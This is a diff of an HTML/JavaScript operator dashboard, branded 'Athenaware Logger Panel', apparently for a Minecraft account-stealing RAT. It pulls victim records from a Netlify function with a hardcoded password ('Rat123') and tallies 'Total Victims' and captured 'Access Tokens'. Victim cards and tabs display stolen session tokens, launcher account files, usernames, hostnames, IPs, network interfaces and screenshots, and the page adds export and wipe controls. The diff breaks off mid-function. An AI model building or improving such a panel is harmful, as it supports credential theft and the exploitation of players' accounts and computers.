@@ -1,10 +1,13 @@
-<!-- index.html - Netlify Dashboard -->
+<!-- index.html - Professional Logger Dashboard (No Login) -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Logger Dashboard</title>
+    <title>Athenaware • Logger Panel</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -13,181 +16,282 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0e1a;
-            color: #e0e0e0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0c0f;
+            color: #e5e7eb;
+            line-height: 1.5;
             min-height: 100vh;
-            padding: 20px;
         }
 
-        .container {
-            max-width: 1400px;
+        .app {
+            max-width: 1600px;
             margin: 0 auto;
+            padding: 24px;
         }
 
-        header {
+        /* Header */
+        .header {
+            background: #14171c;
+            border-radius: 16px;
+            padding: 24px 32px;
+            margin-bottom: 24px;
+            border: 1px solid #2a2f36;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: #151f2e;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            border-left: 4px solid #00ff88;
         }
 
-        h1 {
+        .logo h1 {
             font-size: 28px;
-            font-weight: 600;
-            background: linear-gradient(45deg, #00ff88, #00aaff);
+            font-weight: 700;
+            background: linear-gradient(135deg, #f59e0b, #f97316);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
         }
 
-        .stats {
+        .logo p {
+            color: #8b949e;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        .stats-grid {
             display: flex;
-            gap: 30px;
+            gap: 32px;
         }
 
-        .stat-item {
-            text-align: center;
+        .stat {
+            text-align: right;
         }
 
         .stat-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: #00ff88;
+            font-size: 28px;
+            font-weight: 700;
+            color: #f97316;
         }
 
         .stat-label {
-            font-size: 14px;
-            color: #8899aa;
+            font-size: 13px;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .password-panel {
-            background: #1a2635;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 30px;
+        /* Control Bar */
+        .control-bar {
+            background: #14171c;
+            border-radius: 16px;
+            padding: 20px 24px;
+            margin-bottom: 24px;
+            border: 1px solid #2a2f36;
             display: flex;
-            gap: 15px;
+            gap: 16px;
             align-items: center;
-            border: 1px solid #2a3747;
+            flex-wrap: wrap;
         }
 
-        .password-panel input {
+        .search-box {
             flex: 1;
-            padding: 15px;
-            background: #0f1a24;
-            border: 1px solid #2a3747;
-            color: #00ff88;
-            font-family: monospace;
-            font-size: 18px;
-            border-radius: 6px;
+            min-width: 300px;
+            background: #1e2228;
+            border: 1px solid #2f353e;
+            border-radius: 12px;
+            padding: 14px 20px;
+            color: #e5e7eb;
+            font-size: 15px;
+            transition: all 0.2s;
         }
 
-        .password-panel input:focus {
+        .search-box:focus {
             outline: none;
-            border-color: #00ff88;
-            box-shadow: 0 0 10px rgba(0,255,136,0.2);
+            border-color: #f97316;
+            box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.1);
         }
 
         .btn {
-            padding: 15px 30px;
-            background: linear-gradient(45deg, #00ff88, #00aaff);
-            color: #0a0e1a;
+            background: #f97316;
+            color: white;
             border: none;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 16px;
+            border-radius: 12px;
+            padding: 14px 24px;
+            font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
-            transition: transform 0.2s;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
         }
 
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
+            background: #fb923c;
+            transform: translateY(-1px);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #2f353e;
+            color: #e5e7eb;
+        }
+
+        .btn-outline:hover {
+            background: #1e2228;
+            border-color: #f97316;
         }
 
         .btn-danger {
-            background: linear-gradient(45deg, #ff4444, #ff8888);
+            background: #991b1b;
         }
 
+        .btn-danger:hover {
+            background: #b91c1c;
+        }
+
+        /* Empty State */
+        .empty-state {
+            background: #14171c;
+            border-radius: 16px;
+            padding: 80px 32px;
+            text-align: center;
+            border: 1px solid #2a2f36;
+        }
+
+        .empty-icon {
+            font-size: 64px;
+            margin-bottom: 24px;
+            opacity: 0.5;
+        }
+
+        .empty-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #e5e7eb;
+        }
+
+        .empty-text {
+            color: #8b949e;
+            font-size: 15px;
+            max-width: 400px;
+            margin: 0 auto 24px;
+        }
+
+        /* Victims Grid */
         .victims-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
             gap: 20px;
-            margin-bottom: 30px;
+            margin-top: 20px;
         }
 
         .victim-card {
-            background: #151f2e;
-            border-radius: 10px;
-            padding: 20px;
-            border-left: 4px solid #00ff88;
+            background: #14171c;
+            border-radius: 16px;
+            border: 1px solid #2a2f36;
+            overflow: hidden;
+            transition: all 0.2s;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            position: relative;
-            border: 1px solid #2a3747;
         }
 
         .victim-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0,255,136,0.15);
-            border-color: #00ff88;
+            border-color: #f97316;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(249, 115, 22, 0.15);
         }
 
-        .victim-header {
+        .card-header {
+            padding: 20px;
+            background: #1a1e24;
+            border-bottom: 1px solid #2a2f36;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 15px;
         }
 
         .victim-id {
-            font-family: monospace;
-            font-size: 14px;
-            color: #00ff88;
-            background: #0f1a24;
-            padding: 4px 8px;
-            border-radius: 4px;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 13px;
+            color: #f97316;
+            background: #2a1e14;
+            padding: 4px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.3px;
+            border: 1px solid #3b2a1a;
         }
 
         .victim-time {
             font-size: 12px;
-            color: #8899aa;
+            color: #8b949e;
         }
 
-        .victim-info {
-            margin: 10px 0;
+        .card-body {
+            padding: 20px;
         }
 
         .info-row {
             display: flex;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
             font-size: 14px;
         }
 
         .info-label {
-            width: 100px;
-            color: #8899aa;
-        }
-
-        .info-value {
-            color: #e0e0e0;
+            width: 90px;
+            color: #8b949e;
             font-weight: 500;
         }
 
-        .badge {
-            background: #1f2c3c;
-            color: #00ff88;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 12px;
-            margin-right: 5px;
+        .info-value {
+            color: #e5e7eb;
+            font-weight: 500;
+            flex: 1;
+            word-break: break-word;
         }
 
+        .token-preview {
+            background: #1e1e2e;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #f87171;
+            border: 1px solid #3b2a2a;
+            margin-top: 8px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .badge-container {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .badge {
+            background: #1e293b;
+            color: #94a3b8;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            border: 1px solid #334155;
+        }
+
+        .badge.mod {
+            background: #1e3a2f;
+            color: #4ade80;
+            border-color: #166534;
+        }
+
+        .badge.screenshot {
+            background: #2a1e14;
+            color: #f97316;
+            border-color: #3b2a1a;
+        }
+
+        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -195,474 +299,861 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
             z-index: 1000;
             overflow-y: auto;
+            padding: 40px 20px;
         }
 
         .modal-content {
-            background: #151f2e;
-            margin: 50px auto;
-            padding: 30px;
-            width: 90%;
-            max-width: 900px;
-            border-radius: 15px;
-            border: 1px solid #00ff88;
-            position: relative;
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #14171c;
+            border-radius: 24px;
+            border: 1px solid #2f353e;
+            overflow: hidden;
         }
 
-        .close {
-            position: absolute;
-            right: 25px;
-            top: 20px;
+        .modal-header {
+            padding: 24px 32px;
+            background: #1a1e24;
+            border-bottom: 1px solid #2a2f36;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #e5e7eb;
+        }
+
+        .modal-header .close {
+            background: none;
+            border: none;
+            color: #8b949e;
             font-size: 28px;
             cursor: pointer;
-            color: #8899aa;
+            padding: 0 8px;
+            line-height: 1;
         }
 
-        .close:hover {
-            color: #00ff88;
+        .modal-header .close:hover {
+            color: #f97316;
         }
 
-        .data-tabs {
+        .modal-tabs {
             display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
+            gap: 4px;
+            padding: 20px 32px 0;
+            background: #14171c;
+            border-bottom: 1px solid #2a2f36;
         }
 
         .tab-btn {
-            padding: 10px 20px;
-            background: #0f1a24;
-            border: 1px solid #2a3747;
-            color: #e0e0e0;
-            border-radius: 6px;
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .tab-btn:hover {
+            color: #e5e7eb;
         }
 
         .tab-btn.active {
-            background: #00ff88;
-            color: #0a0e1a;
-            border-color: #00ff88;
+            color: #f97316;
+            border-bottom-color: #f97316;
         }
 
-        .tab-content {
+        .modal-body {
+            padding: 32px;
+        }
+
+        .tab-pane {
             display: none;
-            background: #0f1a24;
-            padding: 20px;
-            border-radius: 10px;
-            border: 1px solid #2a3747;
         }
 
-        .tab-content.active {
+        .tab-pane.active {
             display: block;
         }
 
-        pre {
-            background: #0a0e1a;
-            padding: 15px;
-            border-radius: 6px;
-            overflow-x: auto;
-            color: #00ff88;
+        .data-section {
+            margin-bottom: 28px;
+        }
+
+        .data-section h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #e5e7eb;
+            margin-bottom: 12px;
+        }
+
+        .data-card {
+            background: #1a1e24;
+            border: 1px solid #2f353e;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+        }
+
+        .data-item {
+            background: #14171c;
+            padding: 16px;
+            border-radius: 10px;
+            border: 1px solid #2a2f36;
+        }
+
+        .data-item .label {
+            font-size: 12px;
+            color: #8b949e;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .data-item .value {
+            font-size: 14px;
+            color: #e5e7eb;
+            font-weight: 500;
+            word-break: break-word;
+            font-family: monospace;
+        }
+
+        .token-display {
+            background: #1e1e2e;
+            color: #f87171;
+            padding: 16px;
+            border-radius: 10px;
             font-family: monospace;
             font-size: 13px;
-            max-height: 400px;
-            overflow-y: auto;
-            border: 1px solid #2a3747;
+            border: 1px solid #3b2a2a;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
 
         .screenshot-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
+            gap: 16px;
         }
 
         .screenshot-item {
-            background: #0f1a24;
-            padding: 10px;
-            border-radius: 6px;
-            border: 1px solid #2a3747;
+            background: #1a1e24;
+            border: 1px solid #2f353e;
+            border-radius: 10px;
+            overflow: hidden;
         }
 
         .screenshot-item img {
             width: 100%;
             height: 150px;
             object-fit: cover;
-            border-radius: 4px;
             cursor: pointer;
+            transition: transform 0.2s;
         }
 
-        .screenshot-item p {
-            margin-top: 8px;
+        .screenshot-item img:hover {
+            transform: scale(1.05);
+        }
+
+        .screenshot-item .filename {
+            padding: 10px;
             font-size: 12px;
+            color: #8b949e;
             text-align: center;
-            color: #8899aa;
+            border-top: 1px solid #2f353e;
         }
 
-        .search-box {
-            width: 100%;
-            padding: 15px;
-            background: #0f1a24;
-            border: 1px solid #2a3747;
-            color: #e0e0e0;
-            border-radius: 6px;
+        pre {
+            background: #1a1e24;
+            padding: 16px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: monospace;
+            font-size: 13px;
+            color: #a5d6ff;
+            border: 1px solid #2f353e;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 60px;
+            color: #8b949e;
+        }
+
+        .error-message {
+            background: #2a1a1a;
+            border: 1px solid #991b1b;
+            color: #fca5a5;
+            padding: 16px 24px;
+            border-radius: 12px;
             margin-bottom: 20px;
-            font-size: 16px;
         }
 
-        .search-box:focus {
-            outline: none;
-            border-color: #00ff88;
-        }
-
+        /* Footer */
         .footer {
-            text-align: center;
             margin-top: 40px;
+            text-align: center;
             padding: 20px;
-            color: #8899aa;
-            border-top: 1px solid #2a3747;
+            color: #4b5563;
+            font-size: 14px;
+            border-top: 1px solid #2a2f36;
+        }
+
+        .footer a {
+            color: #f97316;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 16px;
+                align-items: flex-start;
+            }
+            
+            .stats-grid {
+                width: 100%;
+                justify-content: space-between;
+            }
+            
+            .control-bar {
+                flex-direction: column;
+            }
+            
+            .search-box {
+                width: 100%;
+                min-width: auto;
+            }
+            
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .data-grid {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>🔐 Logger Dashboard</h1>
-            <div class="stats">
-                <div class="stat-item">
+    <div class="app" id="app">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <h1>ATHENAWARE</h1>
+                <p>Professional Logger Panel • Live Data</p>
+            </div>
+            <div class="stats-grid">
+                <div class="stat">
                     <div class="stat-value" id="totalVictims">0</div>
                     <div class="stat-label">Total Victims</div>
                 </div>
-                <div class="stat-item">
+                <div class="stat">
                     <div class="stat-value" id="todayVictims">0</div>
                     <div class="stat-label">Last 24h</div>
                 </div>
+                <div class="stat">
+                    <div class="stat-value" id="tokenCount">0</div>
+                    <div class="stat-label">Access Tokens</div>
+                </div>
             </div>
-        </header>
-
-        <div class="password-panel">
-            <input type="password" id="passwordInput" placeholder="Enter password" value="Rat123">
-            <button class="btn" onclick="fetchData()">🔓 Unlock</button>
-            <button class="btn btn-danger" onclick="clearAllData()">🗑️ Clear All</button>
         </div>
 
-        <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by username, IP, victim ID..." onkeyup="filterVictims()">
-
-        <div id="victimsContainer" class="victims-grid">
-            <!-- Victims will be loaded here -->
+        <!-- Control Bar - No Login -->
+        <div class="control-bar">
+            <input type="text" class="search-box" id="searchInput" placeholder="Search by username, UUID, IP, victim ID..." onkeyup="filterVictims()">
+            <button class="btn" onclick="refreshData()">
+                <span>🔄</span> Refresh Data
+            </button>
+            <button class="btn btn-outline" onclick="exportData()">
+                <span>📥</span> Export JSON
+            </button>
+            <button class="btn btn-danger" onclick="clearAllData()">
+                <span>🗑️</span> Wipe All
+            </button>
         </div>
 
+        <!-- Main Content -->
+        <div id="contentArea">
+            <!-- Empty State (shown when no data) -->
+            <div class="empty-state" id="emptyState">
+                <div class="empty-icon">📡</div>
+                <div class="empty-title">No Victims Yet</div>
+                <div class="empty-text">Waiting for incoming connections. The panel automatically updates every 30 seconds.</div>
+                <button class="btn" onclick="refreshData()">
+                    <span>🔄</span> Check Now
+                </button>
+            </div>
+
+            <!-- Victims Grid (hidden by default) -->
+            <div id="victimsContainer" class="victims-grid" style="display: none;"></div>
+        </div>
+
+        <!-- Footer -->
         <div class="footer">
-            Logger Dashboard v2.0 • Data is encrypted at rest
+            Athenaware • © 2026 • <span id="updateTime">Waiting for data...</span>
         </div>
     </div>
 
     <!-- Modal -->
     <div id="victimModal" class="modal">
         <div class="modal-content">
-            <span class="close" onclick="closeModal()">&times;</span>
-            <h2 id="modalTitle" style="margin-bottom: 20px; color: #00ff88;"></h2>
-            
-            <div class="data-tabs" id="modalTabs">
-                <!-- Tabs will be generated here -->
+            <div class="modal-header">
+                <h2 id="modalTitle">Victim Details</h2>
+                <button class="close" onclick="closeModal()">&times;</button>
             </div>
-
-            <div id="modalContent">
-                <!-- Content will be loaded here -->
+            <div class="modal-tabs" id="modalTabs">
+                <button class="tab-btn active" onclick="showTab('minecraft')">Minecraft</button>
+                <button class="tab-btn" onclick="showTab('system')">System</button>
+                <button class="tab-btn" onclick="showTab('files')">Files</button>
+                <button class="tab-btn" onclick="showTab('screenshots')">Screenshots</button>
+                <button class="tab-btn" onclick="showTab('raw')">Raw JSON</button>
+            </div>
+            <div class="modal-body" id="modalBody">
+                <!-- Content loaded dynamically -->
             </div>
         </div>
     </div>
 
     <script>
+        // Configuration
+        const API_PASSWORD = 'Rat123'; // Hardcoded password for API calls
+        
+        // State
         let currentData = [];
-        let currentPassword = 'Rat123';
+        let selectedVictim = null;
+        let autoRefreshInterval = null;
 
-        function fetchData() {
-            const password = document.getElementById('passwordInput').value;
-            currentPassword = password;
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            fetchData();
+            
+            // Auto refresh every 30 seconds
+            autoRefreshInterval = setInterval(() => {
+                fetchData(true); // Silent refresh
+            }, 30000);
+        });
 
-            fetch('/.netlify/functions/get-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ password: password })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    currentData = data.data || [];
-                    updateStats();
-                    renderVictims();
-                } else {
-                    alert('Invalid password');
-                }
-            })
-            .catch(() => {
-                // Demo data for testing
-                currentData = generateDemoData();
-                updateStats();
-                renderVictims();
-            });
-        }
-
-        function generateDemoData() {
-            const demo = [];
-            for (let i = 0; i < 5; i++) {
-                demo.push({
-                    victim_id: '7f3b8a2e' + i + 'd4c6b8',
-                    timestamp: Date.now() - (i * 3600000),
-                    minecraft_data: {
-                        username: 'Player' + i,
-                        uuid: '1234567890abcdef' + i,
-                        access_token: 'token_xyz_' + i,
-                        server_address: 'hypixel.net'
-                    },
-                    system_info: {
-                        os: 'Windows 10',
-                        user: 'victim' + i,
-                        hostname: 'DESKTOP-ABC' + i,
-                        local_ip: '192.168.1.' + (100 + i)
-                    },
-                    installed_mods: [
-                        { name: 'optifine.jar', size: 2500000 },
-                        { name: 'lunar-client.jar', size: 1800000 }
-                    ],
-                    minecraft_files: {
-                        launcher_accounts_json: '{"accounts":[{"name":"test' + i + '"}]}',
-                        options_txt: 'lang:en_US\nmusic:0.5'
-                    },
-                    screenshots: [
-                        { filename: 'screenshot1.png', data: '' }
-                    ]
-                });
+        // Fetch data from Netlify function
+        async function fetchData(silent = false) {
+            if (!silent) {
+                showLoading(true);
             }
-            return demo;
+
+            try {
+                const response = await fetch('/.netlify/functions/get-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password: API_PASSWORD })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    currentData = result.data || [];
+                    updateUI();
+                    document.getElementById('updateTime').textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
+                } else {
+                    if (!silent) {
+                        showError('Failed to fetch data');
+                    }
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                if (!silent) {
+                    showError('Connection error');
+                }
+            } finally {
+                if (!silent) {
+                    showLoading(false);
+                }
+            }
         }
 
+        // Refresh data
+        function refreshData() {
+            fetchData(false);
+        }
+
+        // Update UI based on data
+        function updateUI() {
+            const emptyState = document.getElementById('emptyState');
+            const victimsContainer = document.getElementById('victimsContainer');
+            const searchInput = document.getElementById('searchInput');
+
+            if (!currentData || currentData.length === 0) {
+                emptyState.style.display = 'block';
+                victimsContainer.style.display = 'none';
+                updateStats();
+                return;
+            }
+
+            emptyState.style.display = 'none';
+            victimsContainer.style.display = 'grid';
+            
+            if (searchInput) searchInput.value = '';
+
+            updateStats();
+            renderVictims(currentData);
+        }
+
+        // Update statistics
         function updateStats() {
-            document.getElementById('totalVictims').textContent = currentData.length;
+            const total = currentData.length;
+            const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
+            const today = currentData.filter(v => {
+                const timestamp = v.timestamp || v.receivedAt || 0;
+                return timestamp > oneDayAgo;
+            }).length;
             
-            const oneDayAgo = Date.now() - 86400000;
-            const today = currentData.filter(v => v.timestamp > oneDayAgo).length;
+            const tokens = currentData.filter(v => 
+                v.minecraft_data?.access_token && 
+                v.minecraft_data.access_token !== 'null' && 
+                v.minecraft_data.access_token.length > 10
+            ).length;
+
+            document.getElementById('totalVictims').textContent = total;
             document.getElementById('todayVictims').textContent = today;
+            document.getElementById('tokenCount').textContent = tokens;
         }
 
-        function renderVictims() {
+        // Render victims grid
+        function renderVictims(victims) {
             const container = document.getElementById('victimsContainer');
             container.innerHTML = '';
 
-            currentData.forEach(victim => {
-                const card = document.createElement('div');
-                card.className = 'victim-card';
-                card.onclick = () => openModal(victim);
+            if (!victims || victims.length === 0) {
+                container.innerHTML = '<div class="empty-state" style="grid-column: 1/-1;">No victims match your search</div>';
+                return;
+            }
 
-                const time = new Date(victim.timestamp).toLocaleString();
-
-                card.innerHTML = `
-                    <div class="victim-header">
-                        <span class="victim-id">${victim.victim_id.substring(0, 8)}...</span>
-                        <span class="victim-time">${time}</span>
-                    </div>
-                    <div class="victim-info">
-                        <div class="info-row">
-                            <span class="info-label">Username:</span>
-                            <span class="info-value">${victim.minecraft_data?.username || 'N/A'}</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">UUID:</span>
-                            <span class="info-value">${(victim.minecraft_data?.uuid || '').substring(0, 8)}...</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">System:</span>
-                            <span class="info-value">${victim.system_info?.os || 'N/A'}</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">User:</span>
-                            <span class="info-value">${victim.system_info?.user || 'N/A'}</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">IP:</span>
-                            <span class="info-value">${victim.system_info?.local_ip || 'N/A'}</span>
-                        </div>
-                    </div>
-                    <div style="margin-top: 10px;">
-                        <span class="badge">🎮 ${victim.installed_mods?.length || 0} mods</span>
-                        <span class="badge">📸 ${victim.screenshots?.length || 0} screenshots</span>
-                    </div>
-                `;
-
+            victims.forEach(victim => {
+                const card = createVictimCard(victim);
                 container.appendChild(card);
             });
         }
 
+        // Create victim card element
+        function createVictimCard(victim) {
+            const card = document.createElement('div');
+            card.className = 'victim-card';
+            card.onclick = () => openModal(victim);
+
+            const timestamp = victim.timestamp || victim.receivedAt || Date.now();
+            const date = new Date(timestamp);
+            const timeStr = date.toLocaleString();
+
+            const username = victim.minecraft_data?.username || 'Unknown';
+            const uuid = victim.minecraft_data?.uuid || 'N/A';
+            const ip = victim.system_info?.local_ip || victim.system_info?.ip || 'N/A';
+            const os = victim.system_info?.os || 'Unknown';
+            const user = victim.system_info?.user || 'Unknown';
+            const hasToken = victim.minecraft_data?.access_token && 
+                            victim.minecraft_data.access_token !== 'null' && 
+                            victim.minecraft_data.access_token.length > 10;
+            const modCount = victim.installed_mods?.length || 0;
+            const screenshotCount = victim.screenshots?.length || 0;
+
+            const victimId = victim.victim_id || victim._id || 'unknown';
+            const shortId = victimId.substring(0, 8) + '...';
+
+            card.innerHTML = `
+                <div class="card-header">
+                    <span class="victim-id">${shortId}</span>
+                    <span class="victim-time">${timeStr}</span>
+                </div>
+                <div class="card-body">
+                    <div class="info-row">
+                        <span class="info-label">Username</span>
+                        <span class="info-value">${escapeHtml(username)}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">UUID</span>
+                        <span class="info-value">${escapeHtml(uuid.substring(0, 8))}...</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">System</span>
+                        <span class="info-value">${escapeHtml(os)}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">User</span>
+                        <span class="info-value">${escapeHtml(user)}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">IP</span>
+                        <span class="info-value">${escapeHtml(ip)}</span>
+                    </div>
+                    
+                    ${hasToken ? '<div class="token-preview">🔑 Access token captured</div>' : ''}
+                    
+                    <div class="badge-container">
+                        ${modCount > 0 ? `<span class="badge mod">📦 ${modCount} mods</span>` : ''}
+                        ${screenshotCount > 0 ? `<span class="badge screenshot">📸 ${screenshotCount} screenshots</span>` : ''}
+                    </div>
+                </div>
+            `;
+
+            return card;
+        }
+
+        // Filter victims based on search
         function filterVictims() {
-            const search = document.getElementById('searchInput').value.toLowerCase();
-            
-            const filtered = currentData.filter(v => 
-                v.victim_id.toLowerCase().includes(search) ||
-                v.minecraft_data?.username?.toLowerCase().includes(search) ||
-                v.system_info?.user?.toLowerCase().includes(search) ||
-                v.system_info?.local_ip?.includes(search)
-            );
+            const search = document.getElementById('searchInput').value.toLowerCase().trim();
 
-            const container = document.getElementById('victimsContainer');
-            container.innerHTML = '';
+            if (!search) {
+                renderVictims(currentData);
+                return;
+            }
 
-            filtered.forEach(victim => {
-                const card = document.createElement('div');
-                card.className = 'victim-card';
-                card.onclick = () => openModal(victim);
+            const filtered = currentData.filter(victim => {
+                const username = (victim.minecraft_data?.username || '').toLowerCase();
+                const uuid = (victim.minecraft_data?.uuid || '').toLowerCase();
+                const ip = (victim.system_info?.local_ip || victim.system_info?.ip || '').toLowerCase();
+                const victimId = (victim.victim_id || victim._id || '').toLowerCase();
+                const user = (victim.system_info?.user || '').toLowerCase();
+                const hostname = (victim.system_info?.hostname || '').toLowerCase();
+                const os = (victim.system_info?.os || '').toLowerCase();
 
-                card.innerHTML = `
-                    <div class="victim-header">
-                        <span class="victim-id">${victim.victim_id.substring(0, 8)}...</span>
-                        <span class="victim-time">${new Date(victim.timestamp).toLocaleString()}</span>
-                    </div>
-                    <div class="victim-info">
-                        <div class="info-row">
-                            <span class="info-label">Username:</span>
-                            <span class="info-value">${victim.minecraft_data?.username || 'N/A'}</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">User:</span>
-                            <span class="info-value">${victim.system_info?.user || 'N/A'}</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">IP:</span>
-                            <span class="info-value">${victim.system_info?.local_ip || 'N/A'}</span>
-                        </div>
-                    </div>
-                `;
-
-                container.appendChild(card);
+                return username.includes(search) ||
+                       uuid.includes(search) ||
+                       ip.includes(search) ||
+                       victimId.includes(search) ||
+                       user.includes(search) ||
+                       hostname.includes(search) ||
+                       os.includes(search);
             });
+
+            renderVictims(filtered);
         }
 
+        // Open modal with victim details
         function openModal(victim) {
+            selectedVictim = victim;
             const modal = document.getElementById('victimModal');
-            document.getElementById('modalTitle').textContent = `Victim: ${victim.minecraft_data?.username || 'Unknown'} (${victim.victim_id})`;
+            const username = victim.minecraft_data?.username || 'Unknown';
+            const victimId = victim.victim_id || victim._id || 'unknown';
             
-            generateTabs(victim);
+            document.getElementById('modalTitle').textContent = `${username} • ${victimId.substring(0, 8)}`;
+            
+            // Reset tabs
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-btn')[0].classList.add('active');
+            
+            // Load Minecraft tab by default
             showTab('minecraft');
             
             modal.style.display = 'block';
         }
 
-        function generateTabs(victim) {
-            const tabs = ['minecraft', 'system', 'files', 'mods', 'screenshots'];
-            const tabsContainer = document.getElementById('modalTabs');
-            tabsContainer.innerHTML = '';
-
-            tabs.forEach(tab => {
-                const btn = document.createElement('button');
-                btn.className = 'tab-btn';
-                btn.textContent = tab.charAt(0).toUpperCase() + tab.slice(1);
-                btn.onclick = () => showTab(tab);
-                tabsContainer.appendChild(btn);
-            });
-        }
-
-        function showTab(tabName) {
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-
-            const victim = currentData.find(v => v.victim_id === document.getElementById('modalTitle').textContent.split('(')[1]?.replace(')', ''));
-            if (!victim) return;
-
-            const contentDiv = document.getElementById('modalContent');
-            
-            switch(tabName) {
-                case 'minecraft':
-                    contentDiv.innerHTML = `
-                        <div class="tab-content active">
-                            <h3>Minecraft Data</h3>
-                            <pre>${JSON.stringify(victim.minecraft_data, null, 2)}</pre>
-                            <h3 style="margin-top: 20px;">Access Token</h3>
-                            <pre style="color: #ff8888;">${victim.minecraft_data?.access_token || 'N/A'}</pre>
-                        </div>
-                    `;
-                    break;
-                case 'system':
-                    contentDiv.innerHTML = `
-                        <div class="tab-content active">
-                            <h3>System Information</h3>
-                            <pre>${JSON.stringify(victim.system_info, null, 2)}</pre>
-                            <h3 style="margin-top: 20px;">Network Interfaces</h3>
-                            <pre>${JSON.stringify(victim.network_interfaces, null, 2)}</pre>
-                        </div>
-                    `;
-                    break;
-                case 'files':
-                    contentDiv.innerHTML = `
